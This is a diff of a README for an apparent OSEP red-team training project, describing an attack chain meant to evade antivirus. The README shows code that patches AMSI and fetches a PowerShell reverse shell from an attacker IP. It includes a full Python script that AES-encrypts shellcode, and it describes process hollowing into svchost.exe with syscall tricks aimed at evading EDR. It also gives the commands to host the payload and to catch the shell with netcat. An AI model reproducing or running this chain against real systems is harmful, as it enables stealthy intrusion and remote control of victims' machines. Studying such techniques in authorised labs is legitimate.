@@ -2,13 +2,14 @@
 
 # 🔒 Advanced Shellcode Execution via Process Hollowing and AES Encryption
 
-This project demonstrates a stealthy approach to executing an AES-encrypted PowerShell reverse shell using a custom C# loader, `donut` for shellcode generation, and a custom runner using **indirect syscalls** and **process hollowing** techniques.
+This project demonstrates a stealthy approach to executing an AES-encrypted PowerShell reverse shell using a custom C# loader, `donut` for shellcode generation, and a custom runner using **partial indirect syscalls** and **process hollowing** techniques.
 
 ---
 
 ## 🧩 Step 1 - Build the PowerShell Loader (`Project_Stealth.cs`)
 
 Create a minimal C# console project and include the following logic to:
+
 - Patch AMSI via `.NET Reflection`
 - Download and execute a PowerShell payload (e.g., reverse shell)
 - Use base64 obfuscation for script names
@@ -20,7 +21,6 @@ C:\Program Files\WindowsPowerShell\Modules\PowerShellGet\<version>\System.Manage
 
 ### Core logic:
 ```csharp
-// AMSI bypass + remote script execution
 string attackerIP = "192.168.1.94";
 PatchAMSI();
 string psUrl = $"http://{attackerIP}/shell.ps1";
@@ -47,22 +47,51 @@ Use [Donut](https://github.com/TheWover/donut) to convert the compiled loader in
 
 Use this Python script to AES-encrypt the generated shellcode and format the output as C# byte arrays for easy pasting:
 
-Paste the arrays into your Process Hollowing runner.
+```python
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+import pyperclip
+
+with open("shellcode.bin", "rb") as f:
+    raw_shellcode = f.read()
+
+key = get_random_bytes(32)
+iv = get_random_bytes(16)
+pad_len = 16 - (len(raw_shellcode) % 16)
+padded_shellcode = raw_shellcode + bytes([pad_len] * pad_len)
+
+cipher = AES.new(key, AES.MODE_CBC, iv)
+encrypted = cipher.encrypt(padded_shellcode)
+
+def format_csharp_array(name, byte_data):
+    return f"byte[] {name} = new byte[] {{ {', '.join(f'0x{b:02x}' for b in byte_data)} }};"
+
+output = (
+    format_csharp_array("encryptedShellcode", encrypted) + "\n\n" +
+    format_csharp_array("aesKey", key) + "\n\n" +
+    format_csharp_array("aesIV", iv)
+)
+
+pyperclip.copy(output)
+print("[+] C# arrays generated and copied to clipboard.")
+```
+
+Paste the generated arrays into your Process Hollowing runner.
 
 ---
 
-## 🧠 Step 4 - Execute with Advanced Process Hollowing + Indirect Syscalls
+## 🧠 Step 4 - Execute with Process Hollowing + Partial Indirect Syscalls
 
 Use the included `ShellCode_Runner.cs` script to:
 
 - Create a suspended process (`svchost.exe`)
-- Allocate RWX memory via **indirect syscall**
-- Write and decrypt AES shellcode
-- Change protection and execute via `NtCreateThreadEx` (indirect syscall)
+- Allocate RWX memory via partially indirect syscall
+- Decrypt and write the AES-encrypted shellcode
+- Change protection and execute via `NtCreateThreadEx`
 
-All syscalls (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, etc.) are resolved at runtime and executed from memory stubs to evade AV/EDR.
+> Note: Only `NtAllocateVirtualMemory` uses an indirect syscall via a memory stub. Other syscalls (`NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx`) are still invoked via direct P/Invoke.
 
-📌 Replace the following placeholders with your encrypted values:
+📌 Replace the following placeholders with your actual AES-encrypted shellcode and keys:
 
 ```csharp
 byte[] encryptedShellcode = new byte[] { ... };
@@ -72,13 +101,37 @@ byte[] aesIV = new byte[] { ... };
 
 ---
 
-## ✅ Result
+## 🖥️ Hosting the Reverse Shell Payload
 
-- AMSI patched silently
-- Reverse shell loaded via PowerShell (downloaded at runtime)
-- Shellcode encrypted, injected, and executed stealthily
-- Full evasion of Defender in OSEP lab environments
+The PowerShell reverse shell is hosted in a file named `shell.ps1`.
+
+
+Then serve the file using Python's HTTP server from the directory containing `shell.ps1`:
+
+```bash
+python3 -m http.server 80
+```
 
 ---
 
-**Built for OSEP training purposes. Use only in lab environments.**
+## 📡 Setting Up the Listener
+
+Use `rlwrap` with `netcat` to handle a fully interactive reverse shell:
+
+```bash
+rlwrap -cAr nc -lnvp 443
+```
+
+---
+
+## ✅ Final Outcome
+
+- AMSI is silently patched
+- PowerShell payload is downloaded and executed in memory
+- Shellcode is decrypted and injected into a remote process
+- Connection established with full interactivity
+- Tested and working in OSEP lab environments with Defender enabled
+
+---
+
+**Built for OSEP training and red team lab use. Not intended for real-world offensive operations without proper authorization.**
